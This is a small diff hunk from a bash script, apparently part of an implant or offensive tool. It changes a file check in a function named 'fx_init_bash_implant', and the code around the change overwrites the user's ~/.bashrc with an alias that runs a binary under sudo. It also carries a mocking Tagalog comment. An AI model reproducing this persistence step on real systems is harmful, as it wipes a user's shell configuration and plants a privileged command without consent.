@@ -35,7 +35,7 @@ fx_init_bash_implant() {
 
 
     #DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
-    if [ 0 == `cat .blood` ] #if no script is found
+    if grep -q "0" ".blood"
     then
         echo "alias 'wahupdate'='sudo /usr/bin/wahupdate'" > ~/.bashrc
         fx_init_bash_implant
